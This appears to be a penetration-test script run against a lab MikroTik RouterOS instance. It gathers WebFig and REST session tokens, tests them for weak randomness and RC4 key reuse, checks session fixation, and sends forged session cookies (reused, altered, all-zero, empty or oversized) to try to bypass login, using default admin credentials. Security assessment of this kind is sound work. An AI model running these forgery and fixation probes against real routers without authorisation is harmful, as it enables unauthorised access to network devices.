#!/usr/bin/env python3
"""
MikroTik RouterOS `www` Binary — RC4 Session Crypto Analysis (Phase 4)

Analyzes WebFig session token cryptography. The www binary uses RC4::encrypt,
RC4::setKey, and RC4::skip — indicating session tokens may use RC4 stream cipher.

RC4 is cryptographically broken (biased keystream bytes, related-key attacks,
known-plaintext recovery). If session tokens use RC4:
  - Key reuse across sessions → keystream recovery
  - Predictable plaintext → key recovery
  - Session token forgery → auth bypass

Tests:
  1. Collect 100+ session tokens, analyze entropy and patterns
  2. Check for key reuse (XOR pairs of ciphertexts)
  3. Analyze token structure (fixed vs variable components)
  4. Test for related-key patterns across sessions
  5. Attempt session token prediction/forgery
  6. Check if token contains user identity (role escalation via forgery)

Target: MikroTik RouterOS CHR 7.20.8 at [REDACTED-INTERNAL-IP]
Evidence: evidence/attack_www_crypto.json
"""

import json
import time
import sys
import requests
import hashlib
import base64
import re
import struct
import collections
from datetime import datetime
from pathlib import Path

TARGET = "[REDACTED-INTERNAL-IP]"
PORT = 80
AUTH = ("admin", "admin")
EVIDENCE_DIR = Path("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/evidence")

# ── Globals ──────────────────────────────────────────────────────────────────

test_count = 0
anomaly_count = 0
tests = []
findings = []

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)

def add_test(category, name, description, result, details=None, anomaly=False):
    global test_count, anomaly_count
    test_count += 1
    test = {
        "id": test_count,
        "category": category,
        "name": name,
        "description": description,
        "result": result,
        "anomaly": anomaly,
        "timestamp": datetime.now().isoformat(),
    }
    if details:
        test["details"] = details
    tests.append(test)
    if anomaly:
        anomaly_count += 1
    status = "ANOMALY" if anomaly else "OK"
    log(f"  [{status}] {name}: {result}")

def add_finding(severity, title, description, cwe=None):
    finding = {
        "id": len(findings) + 1,
        "severity": severity,
        "title": title,
        "description": description,
        "timestamp": datetime.now().isoformat(),
    }
    if cwe:
        finding["cwe"] = cwe
    findings.append(finding)
    log(f"  FINDING [{severity}]: {title}")

def check_health():
    """Quick health check."""
    try:
        r = requests.get(f"http://{TARGET}/rest/system/resource",
                        auth=AUTH, timeout=5, verify=False)
        if r.status_code == 200:
            data = r.json()
            return {"alive": True, "uptime": data.get("uptime")}
    except:
        pass
    return {"alive": False}


# ══════════════════════════════════════════════════════════════════════════════
# Session Token Collection
# ══════════════════════════════════════════════════════════════════════════════

def collect_session_tokens(count=120):
    """Collect session tokens from WebFig login."""
    log(f"\n--- Collecting {count} session tokens ---")
    tokens = []
    cookies_collected = []

    for i in range(count):
        try:
            # Method 1: Hit WebFig main page and collect Set-Cookie
            session = requests.Session()
            r = session.get(f"http://{TARGET}/", timeout=5, allow_redirects=True)

            # Collect all cookies
            for cookie in session.cookies:
                cookies_collected.append({
                    "name": cookie.name,
                    "value": cookie.value,
                    "domain": cookie.domain,
                    "path": cookie.path,
                    "secure": cookie.secure,
                    "index": i,
                })
                if cookie.value and len(cookie.value) > 4:
                    tokens.append(cookie.value)

            # Also check Set-Cookie headers directly
            set_cookies = r.headers.get("Set-Cookie", "")
            if set_cookies:
                for part in set_cookies.split(","):
                    part = part.strip()
                    if "=" in part:
                        name, _, value = part.partition("=")
                        value = value.split(";")[0].strip()
                        if value and len(value) > 4 and value not in tokens:
                            tokens.append(value)

            # Method 2: Authenticate via REST and collect session
            r2 = session.get(f"http://{TARGET}/rest/system/resource",
                           auth=AUTH, timeout=5)
            for cookie in session.cookies:
                if cookie.value and len(cookie.value) > 4 and cookie.value not in tokens:
                    tokens.append(cookie.value)
                    cookies_collected.append({
                        "name": cookie.name,
                        "value": cookie.value,
                        "domain": cookie.domain,
                        "path": cookie.path,
                        "secure": cookie.secure,
                        "index": i,
                        "method": "rest_auth",
                    })

            if (i + 1) % 20 == 0:
                log(f"  Collected {i+1}/{count} sessions, {len(tokens)} unique tokens so far")

            time.sleep(0.1)  # Don't flood

        except Exception as e:
            log(f"  Session {i}: error: {e}")
            continue

    add_test("collection", "token_collection",
            f"Collected session tokens from {count} sessions",
            f"{len(tokens)} unique tokens from {count} sessions, "
            f"{len(cookies_collected)} total cookies",
            details={
                "unique_tokens": len(tokens),
                "total_cookies": len(cookies_collected),
                "cookie_names": list(set(c["name"] for c in cookies_collected)),
                "sample_tokens": tokens[:10],
            })

    return tokens, cookies_collected


# ══════════════════════════════════════════════════════════════════════════════
# Token Entropy Analysis
# ══════════════════════════════════════════════════════════════════════════════

def analyze_entropy(tokens):
    """Analyze token entropy — low entropy suggests weak randomness or patterns."""
    log(f"\n--- Token Entropy Analysis ({len(tokens)} tokens) ---")

    if not tokens:
        add_test("entropy", "no_tokens", "No tokens to analyze", "SKIP", anomaly=True)
        return {}

    results = {}

    # Token length distribution
    lengths = [len(t) for t in tokens]
    length_counts = collections.Counter(lengths)
    results["length_distribution"] = dict(length_counts)
    results["avg_length"] = sum(lengths) / len(lengths)

    all_same_length = len(length_counts) == 1
    add_test("entropy", "token_lengths",
            "Token length distribution",
            f"Lengths: {dict(length_counts)}, avg={results['avg_length']:.1f}",
            anomaly=all_same_length,
            details=results["length_distribution"])

    # Character frequency analysis
    all_chars = "".join(tokens)
    char_freq = collections.Counter(all_chars)
    total_chars = len(all_chars)

    # Shannon entropy
    import math
    entropy = 0
    for count in char_freq.values():
        p = count / total_chars
        if p > 0:
            entropy -= p * math.log2(p)

    results["shannon_entropy"] = entropy
    results["char_count"] = len(char_freq)
    results["charset"] = "".join(sorted(char_freq.keys()))

    # Expected entropy for random hex = 4.0, random base64 = ~6.0, random alphanumeric = ~5.95
    is_low_entropy = entropy < 4.0

    add_test("entropy", "shannon_entropy",
            "Shannon entropy of token character distribution",
            f"Entropy={entropy:.3f} bits/char, {len(char_freq)} unique chars, "
            f"charset sample: {results['charset'][:50]}",
            anomaly=is_low_entropy,
            details={"entropy": entropy, "unique_chars": len(char_freq)})

    if is_low_entropy:
        add_finding("HIGH", "Low session token entropy",
                   f"Session tokens have only {entropy:.3f} bits/char entropy "
                   f"(expected >5.0 for cryptographically random tokens). "
                   f"This may indicate predictable token generation.",
                   cwe="CWE-330")

    # Check if tokens look like hex, base64, or other encoding
    hex_pattern = re.compile(r'^[0-9a-fA-F]+$')
    b64_pattern = re.compile(r'^[A-Za-z0-9+/=]+$')
    urlsafe_b64 = re.compile(r'^[A-Za-z0-9_-=]+$')

    hex_count = sum(1 for t in tokens if hex_pattern.match(t))
    b64_count = sum(1 for t in tokens if b64_pattern.match(t))
    urlsafe_count = sum(1 for t in tokens if urlsafe_b64.match(t))

    encoding_guess = "unknown"
    if hex_count == len(tokens):
        encoding_guess = "hex"
    elif b64_count == len(tokens):
        encoding_guess = "base64"
    elif urlsafe_count == len(tokens):
        encoding_guess = "urlsafe_base64"

    results["encoding"] = encoding_guess
    add_test("entropy", "token_encoding",
            "Token encoding format analysis",
            f"Encoding: {encoding_guess} (hex={hex_count}, b64={b64_count}, "
            f"urlsafe={urlsafe_count} out of {len(tokens)})")

    # Byte-level analysis if hex
    if encoding_guess == "hex":
        try:
            raw_tokens = [bytes.fromhex(t) for t in tokens]
            # Check for common bytes across tokens (fixed structure)
            if raw_tokens:
                min_len = min(len(t) for t in raw_tokens)
                fixed_positions = []
                for pos in range(min_len):
                    values = set(t[pos] for t in raw_tokens)
                    if len(values) == 1:
                        fixed_positions.append((pos, list(values)[0]))

                results["fixed_byte_positions"] = fixed_positions

                if fixed_positions:
                    add_test("entropy", "fixed_bytes",
                            "Fixed byte positions in tokens",
                            f"{len(fixed_positions)}/{min_len} bytes are constant across all tokens",
                            anomaly=True,
                            details={"positions": [(p, hex(v)) for p, v in fixed_positions[:20]]})

                    if len(fixed_positions) > min_len * 0.3:
                        add_finding("MEDIUM",
                                   "Session token has fixed structure (>30% constant bytes)",
                                   f"{len(fixed_positions)}/{min_len} bytes are identical across "
                                   f"all {len(tokens)} tokens. Fixed structure reduces effective "
                                   f"entropy and may enable token prediction.",
                                   cwe="CWE-330")
        except:
            pass

    return results


# ══════════════════════════════════════════════════════════════════════════════
# Key Reuse Detection
# ══════════════════════════════════════════════════════════════════════════════

def detect_key_reuse(tokens):
    """XOR pairs of tokens — if RC4 with same key, XOR of ciphertexts = XOR of plaintexts."""
    log(f"\n--- Key Reuse Detection (XOR Analysis) ---")

    if len(tokens) < 2:
        add_test("key_reuse", "insufficient_tokens", "Need 2+ tokens", "SKIP")
        return {}

    results = {"xor_pairs": [], "potential_reuse": False}

    # Convert to bytes
    raw_tokens = []
    for t in tokens[:50]:  # Check first 50
        try:
            if all(c in "0123456789abcdefABCDEF" for c in t):
                raw_tokens.append(bytes.fromhex(t))
            else:
                raw_tokens.append(t.encode())
        except:
            raw_tokens.append(t.encode())

    # XOR each pair and check for patterns
    printable_xor_count = 0
    zero_heavy_count = 0

    for i in range(min(20, len(raw_tokens))):
        for j in range(i + 1, min(20, len(raw_tokens))):
            t1, t2 = raw_tokens[i], raw_tokens[j]
            min_len = min(len(t1), len(t2))
            xor_result = bytes(a ^ b for a, b in zip(t1[:min_len], t2[:min_len]))

            # Check if XOR produces mostly printable characters (sign of known plaintext)
            printable = sum(1 for b in xor_result if 32 <= b <= 126)
            zeros = sum(1 for b in xor_result if b == 0)

            if printable > min_len * 0.8:
                printable_xor_count += 1
                results["xor_pairs"].append({
                    "i": i, "j": j,
                    "xor_printable_pct": printable / min_len,
                    "xor_sample": xor_result[:32].hex(),
                })

            if zeros > min_len * 0.5:
                zero_heavy_count += 1

    results["printable_xor_pairs"] = printable_xor_count
    results["zero_heavy_pairs"] = zero_heavy_count

    if printable_xor_count > 0:
        results["potential_reuse"] = True
        add_test("key_reuse", "xor_printable",
                f"XOR of token pairs produces printable output",
                f"{printable_xor_count} pairs with >80% printable XOR — "
                f"suggests RC4 key reuse or predictable plaintext structure",
                anomaly=True,
                details=results["xor_pairs"][:5])

        add_finding("HIGH", "Potential RC4 key reuse in session tokens",
                   f"XOR of {printable_xor_count} token pairs produces mostly printable "
                   f"output, suggesting either key reuse (two-time pad) or highly "
                   f"predictable plaintext structure. Both enable token forgery.",
                   cwe="CWE-323")
    else:
        add_test("key_reuse", "xor_analysis",
                "XOR analysis of token pairs",
                f"No key reuse patterns detected (0/{printable_xor_count} printable XOR pairs)")

    if zero_heavy_count > len(raw_tokens) * 0.3:
        add_test("key_reuse", "similar_tokens",
                "Token similarity (zero-heavy XOR)",
                f"{zero_heavy_count} pairs with >50% zero bytes in XOR — tokens are very similar",
                anomaly=True)

    return results


# ══════════════════════════════════════════════════════════════════════════════
# Token Structure Analysis
# ══════════════════════════════════════════════════════════════════════════════

def analyze_token_structure(tokens):
    """Analyze internal structure — timestamp components, counters, etc."""
    log(f"\n--- Token Structure Analysis ---")

    if not tokens:
        return {}

    results = {}

    # Check for sequential patterns (counter in token)
    if len(tokens) >= 3:
        # Look at each byte position for incrementing values
        raw_tokens = []
        for t in tokens[:50]:
            try:
                if all(c in "0123456789abcdefABCDEF" for c in t):
                    raw_tokens.append(bytes.fromhex(t))
                else:
                    raw_tokens.append(t.encode())
            except:
                raw_tokens.append(t.encode())

        if raw_tokens:
            min_len = min(len(t) for t in raw_tokens)
            sequential_positions = []

            for pos in range(min_len):
                values = [t[pos] for t in raw_tokens]
                # Check if values are incrementing
                diffs = [values[i+1] - values[i] for i in range(len(values)-1)]
                if all(d == 1 for d in diffs):
                    sequential_positions.append(pos)
                elif all(d == diffs[0] and d != 0 for d in diffs):
                    sequential_positions.append(pos)

            if sequential_positions:
                results["sequential_positions"] = sequential_positions
                add_test("structure", "sequential_bytes",
                        "Sequential/counter bytes in tokens",
                        f"Positions {sequential_positions} contain sequential values — "
                        f"counter component enables prediction",
                        anomaly=True)

                add_finding("HIGH", "Sequential counter in session tokens",
                           f"Token byte positions {sequential_positions} contain sequential "
                           f"values that increment with each new session. An attacker can "
                           f"predict future tokens by observing the pattern.",
                           cwe="CWE-330")

    # Check for timestamp in tokens
    now = int(time.time())
    for t in tokens[:5]:
        try:
            raw = bytes.fromhex(t) if all(c in "0123456789abcdefABCDEF" for c in t) else t.encode()
            # Look for unix timestamp (4 bytes)
            for offset in range(len(raw) - 3):
                val = struct.unpack(">I", raw[offset:offset+4])[0]
                if abs(val - now) < 86400:  # Within 1 day
                    results["timestamp_offset"] = offset
                    add_test("structure", "timestamp_in_token",
                            f"Unix timestamp found at offset {offset}",
                            f"Value {val} is within 1 day of current time {now}",
                            anomaly=True)
                    break
                # Little-endian
                val = struct.unpack("<I", raw[offset:offset+4])[0]
                if abs(val - now) < 86400:
                    results["timestamp_offset"] = offset
                    results["timestamp_endian"] = "little"
                    add_test("structure", "timestamp_in_token_le",
                            f"Unix timestamp (LE) found at offset {offset}",
                            f"Value {val} is within 1 day of current time {now}",
                            anomaly=True)
                    break
        except:
            pass

    # Common prefix/suffix analysis
    if len(tokens) >= 2:
        # Find longest common prefix
        prefix_len = 0
        for i in range(min(len(t) for t in tokens)):
            if len(set(t[i] for t in tokens)) == 1:
                prefix_len += 1
            else:
                break

        # Longest common suffix
        suffix_len = 0
        for i in range(1, min(len(t) for t in tokens) + 1):
            if len(set(t[-i] for t in tokens)) == 1:
                suffix_len += 1
            else:
                break

        results["common_prefix_len"] = prefix_len
        results["common_suffix_len"] = suffix_len

        if prefix_len > 0 or suffix_len > 0:
            add_test("structure", "common_prefix_suffix",
                    "Common prefix/suffix in tokens",
                    f"Prefix: {prefix_len} chars, Suffix: {suffix_len} chars — "
                    f"reduces effective entropy",
                    anomaly=(prefix_len + suffix_len > 4))

    add_test("structure", "structure_summary",
            "Token structure analysis complete",
            f"Analyzed {len(tokens)} tokens for structural patterns")

    return results


# ══════════════════════════════════════════════════════════════════════════════
# Session Token Forgery Attempt
# ══════════════════════════════════════════════════════════════════════════════

def attempt_token_forgery(tokens, cookies_collected):
    """If we found patterns, attempt to forge a valid session token."""
    log(f"\n--- Session Token Forgery Attempt ---")

    results = {"attempts": [], "success": False}

    if not cookies_collected:
        add_test("forgery", "no_cookies", "No cookies to forge", "SKIP")
        return results

    # Get a cookie name to use
    cookie_names = list(set(c["name"] for c in cookies_collected))
    if not cookie_names:
        add_test("forgery", "no_cookie_names", "No cookie names found", "SKIP")
        return results

    cookie_name = cookie_names[0]

    # Forgery attempts:
    forgery_payloads = []

    # 1. Reuse an old token
    if tokens:
        forgery_payloads.append(("reuse_old", tokens[0]))

    # 2. Modify last byte of valid token
    if tokens:
        t = tokens[0]
        for delta in [1, -1, 0x80, 0xFF]:
            if all(c in "0123456789abcdefABCDEF" for c in t):
                raw = bytearray.fromhex(t)
                raw[-1] = (raw[-1] + delta) % 256
                forgery_payloads.append((f"modify_last_byte_+{delta}", raw.hex()))
            else:
                modified = t[:-1] + chr((ord(t[-1]) + delta) % 128)
                forgery_payloads.append((f"modify_last_byte_+{delta}", modified))

    # 3. All-zeros token
    if tokens:
        length = len(tokens[0])
        forgery_payloads.append(("all_zeros", "0" * length))
        forgery_payloads.append(("all_ones", "f" * length))
        forgery_payloads.append(("all_A", "A" * length))

    # 4. If we found a counter, predict next value
    # (done in structure analysis)

    # 5. Empty token
    forgery_payloads.append(("empty", ""))

    # 6. Very long token
    forgery_payloads.append(("oversize", "A" * 1024))

    for name, payload in forgery_payloads:
        try:
            r = requests.get(f"http://{TARGET}/rest/system/resource",
                           cookies={cookie_name: payload},
                           timeout=5, verify=False)

            success = r.status_code == 200
            attempt = {
                "name": name,
                "payload_len": len(payload),
                "payload_sample": payload[:64],
                "status_code": r.status_code,
                "authenticated": success,
            }
            results["attempts"].append(attempt)

            if success:
                results["success"] = True
                add_test("forgery", f"forgery_{name}",
                        f"Token forgery attempt: {name}",
                        f"HTTP {r.status_code} — AUTHENTICATED with forged token!",
                        anomaly=True)

                add_finding("CRITICAL",
                           f"Session token forgery successful: {name}",
                           f"Forged session token (method: {name}) was accepted by the server. "
                           f"This allows unauthenticated access to protected endpoints.",
                           cwe="CWE-384")
            else:
                add_test("forgery", f"forgery_{name}",
                        f"Token forgery attempt: {name}",
                        f"HTTP {r.status_code} — rejected")

        except Exception as e:
            add_test("forgery", f"forgery_{name}",
                    f"Token forgery attempt: {name}",
                    f"Error: {e}")

    return results


# ══════════════════════════════════════════════════════════════════════════════
# Cross-User Token Analysis
# ══════════════════════════════════════════════════════════════════════════════

def analyze_cross_user_tokens():
    """Check if token encodes user identity — can we escalate from read to admin?"""
    log(f"\n--- Cross-User Token Analysis ---")

    results = {}

    # Collect tokens with different auth contexts
    user_tokens = {}

    # Admin session
    try:
        s = requests.Session()
        r = s.get(f"http://{TARGET}/rest/system/resource", auth=AUTH, timeout=5)
        admin_cookies = {c.name: c.value for c in s.cookies}
        user_tokens["admin"] = admin_cookies
        add_test("cross_user", "admin_token",
                "Collected admin session token",
                f"Cookies: {list(admin_cookies.keys())}")
    except Exception as e:
        add_test("cross_user", "admin_token", "Admin token collection", f"Error: {e}")

    # No-auth session
    try:
        s = requests.Session()
        r = s.get(f"http://{TARGET}/", timeout=5)
        noauth_cookies = {c.name: c.value for c in s.cookies}
        user_tokens["noauth"] = noauth_cookies
        add_test("cross_user", "noauth_token",
                "Collected no-auth session token",
                f"Cookies: {list(noauth_cookies.keys())}")
    except Exception as e:
        add_test("cross_user", "noauth_token", "No-auth token collection", f"Error: {e}")

    # Compare tokens between users
    if len(user_tokens) >= 2:
        for u1 in user_tokens:
            for u2 in user_tokens:
                if u1 >= u2:
                    continue
                common_names = set(user_tokens[u1].keys()) & set(user_tokens[u2].keys())
                for name in common_names:
                    v1, v2 = user_tokens[u1][name], user_tokens[u2][name]
                    if v1 == v2:
                        add_test("cross_user", f"same_token_{u1}_{u2}_{name}",
                                f"Same token for {u1} and {u2} (cookie: {name})",
                                f"IDENTICAL — no user identity in token",
                                anomaly=True)
                    else:
                        # XOR to find differences
                        diff_positions = []
                        min_len = min(len(v1), len(v2))
                        for i in range(min_len):
                            if v1[i] != v2[i]:
                                diff_positions.append(i)

                        add_test("cross_user", f"diff_token_{u1}_{u2}_{name}",
                                f"Token difference between {u1} and {u2} (cookie: {name})",
                                f"{len(diff_positions)}/{min_len} bytes differ, "
                                f"len({u1})={len(v1)}, len({u2})={len(v2)}")

    results["user_tokens"] = {
        k: {ck: cv[:32] + "..." if len(cv) > 32 else cv
            for ck, cv in v.items()}
        for k, v in user_tokens.items()
    }

    return results


# ══════════════════════════════════════════════════════════════════════════════
# RC4 Bias Detection
# ══════════════════════════════════════════════════════════════════════════════

def detect_rc4_bias(tokens):
    """Check for RC4-specific biases in token bytes."""
    log(f"\n--- RC4 Bias Detection ---")

    if not tokens or len(tokens) < 20:
        add_test("rc4_bias", "insufficient_data",
                "Need 20+ tokens for RC4 bias detection", "SKIP")
        return {}

    results = {}

    # Convert to raw bytes
    raw_tokens = []
    for t in tokens:
        try:
            if all(c in "0123456789abcdefABCDEF" for c in t):
                raw_tokens.append(bytes.fromhex(t))
            else:
                raw_tokens.append(t.encode())
        except:
            continue

    if not raw_tokens:
        return results

    min_len = min(len(t) for t in raw_tokens)

    # RC4 known biases:
    # 1. Second byte bias: P(Z2 = 0) ≈ 2/256 (Mantin-Shamir bias)
    if min_len >= 2:
        second_bytes = [t[1] for t in raw_tokens]
        zero_count = sum(1 for b in second_bytes if b == 0)
        expected = len(raw_tokens) / 256
        ratio = zero_count / expected if expected > 0 else 0

        is_biased = ratio > 1.5  # 50% more zeros than expected

        add_test("rc4_bias", "second_byte_bias",
                "RC4 Mantin-Shamir second byte bias (P(Z2=0) ≈ 2/256)",
                f"Z2=0 count: {zero_count}/{len(raw_tokens)} "
                f"(expected: {expected:.1f}, ratio: {ratio:.2f}x)",
                anomaly=is_biased,
                details={"zero_count": zero_count, "expected": expected, "ratio": ratio})

        if is_biased:
            add_finding("HIGH", "RC4 second-byte bias detected in session tokens",
                       f"The second byte of session tokens shows {ratio:.1f}x more zero "
                       f"values than expected. This is the classic Mantin-Shamir RC4 bias, "
                       f"confirming RC4 usage. RC4 is cryptographically broken.",
                       cwe="CWE-327")

    # 2. General byte frequency analysis per position
    byte_biases = []
    for pos in range(min(16, min_len)):  # First 16 bytes
        byte_values = [t[pos] for t in raw_tokens]
        freq = collections.Counter(byte_values)

        # Chi-squared test for uniformity
        expected_count = len(raw_tokens) / 256
        chi_sq = sum((count - expected_count) ** 2 / expected_count
                    for count in freq.values())
        # Add contribution for missing values
        missing = 256 - len(freq)
        chi_sq += missing * expected_count

        # Chi-squared critical value for df=255, p=0.01 is ~310
        is_biased = chi_sq > 310

        byte_biases.append({
            "position": pos,
            "unique_values": len(freq),
            "chi_squared": chi_sq,
            "biased": is_biased,
            "top_values": freq.most_common(3),
        })

        if is_biased:
            add_test("rc4_bias", f"byte_bias_pos{pos}",
                    f"Byte position {pos} frequency bias",
                    f"Chi-sq={chi_sq:.1f} (>310 = biased), "
                    f"{len(freq)} unique values, top: {freq.most_common(3)}",
                    anomaly=True)

    results["byte_biases"] = byte_biases
    biased_positions = [b for b in byte_biases if b["biased"]]

    add_test("rc4_bias", "bias_summary",
            f"RC4 bias analysis across first {min(16, min_len)} byte positions",
            f"{len(biased_positions)}/{len(byte_biases)} positions show statistical bias",
            anomaly=(len(biased_positions) > 2))

    return results


# ══════════════════════════════════════════════════════════════════════════════
# Session Fixation Re-check
# ══════════════════════════════════════════════════════════════════════════════

def test_session_fixation():
    """Re-verify session fixation (Finding 10 from main assessment)."""
    log(f"\n--- Session Fixation Verification ---")

    # Generate a fake session ID
    fake_session = "AAAAAABBBBCCCCDDDD1234567890"

    try:
        # Set the fake session cookie and authenticate
        s = requests.Session()
        s.cookies.set("session", fake_session)

        r = s.get(f"http://{TARGET}/rest/system/resource", auth=AUTH, timeout=5)

        # Check if the server accepted or regenerated the session
        final_cookies = {c.name: c.value for c in s.cookies}
        session_kept = final_cookies.get("session") == fake_session

        add_test("fixation", "session_fixation_test",
                "Session fixation: pre-set session cookie accepted?",
                f"{'VULNERABLE' if session_kept else 'Regenerated'} — "
                f"Set: {fake_session[:20]}..., Final: {str(final_cookies.get('session', 'none'))[:20]}...",
                anomaly=session_kept)

        if session_kept:
            add_finding("HIGH", "Session fixation confirmed (pristine [REDACTED-INTERNAL-IP])",
                       f"Server accepts client-supplied session cookie without regeneration "
                       f"after authentication. Confirms Finding 10 from main assessment "
                       f"on fresh pristine CHR.",
                       cwe="CWE-384")
    except Exception as e:
        add_test("fixation", "session_fixation_test",
                "Session fixation test", f"Error: {e}")


# ══════════════════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════════════════

def main():
    log("MikroTik RouterOS `www` Binary — RC4 Session Crypto Analysis (Phase 4)")
    log(f"Target: {TARGET}:{PORT}")
    log(f"Start: {datetime.now().isoformat()}")

    # Health check
    health = check_health()
    if not health["alive"]:
        log("ERROR: Router not responding!")
        return
    log(f"Router alive, uptime: {health.get('uptime')}")

    # Collect tokens
    tokens, cookies = collect_session_tokens(count=120)

    # Analyze
    entropy_results = analyze_entropy(tokens)
    key_reuse_results = detect_key_reuse(tokens)
    structure_results = analyze_token_structure(tokens)
    forgery_results = attempt_token_forgery(tokens, cookies)
    cross_user_results = analyze_cross_user_tokens()
    rc4_bias_results = detect_rc4_bias(tokens)
    test_session_fixation()

    # Final health
    final_health = check_health()
    log(f"Final health: {final_health}")

    # Save evidence
    evidence = {
        "metadata": {
            "script": "attack_www_crypto.py",
            "phase": "Phase 4: RC4 Session Crypto Analysis",
            "target": TARGET,
            "start_time": datetime.now().isoformat(),
            "total_tests": test_count,
            "anomalies": anomaly_count,
            "findings_count": len(findings),
        },
        "tests": tests,
        "findings": findings,
        "analysis": {
            "tokens_collected": len(tokens),
            "entropy": entropy_results,
            "key_reuse": key_reuse_results,
            "structure": structure_results,
            "forgery": forgery_results,
            "cross_user": cross_user_results,
            "rc4_bias": rc4_bias_results,
        },
    }

    out_file = EVIDENCE_DIR / "attack_www_crypto.json"
    with open(out_file, "w") as f:
        json.dump(evidence, f, indent=2, default=str)

    log(f"\n{'='*60}")
    log(f"PHASE 4 COMPLETE: RC4 Session Crypto Analysis")
    log(f"{'='*60}")
    log(f"Tests: {test_count}, Anomalies: {anomaly_count}, Findings: {len(findings)}")
    log(f"Evidence: {out_file}")

    for f_item in findings:
        log(f"  [{f_item['severity']}] {f_item['title']}")


if __name__ == "__main__":
    main()
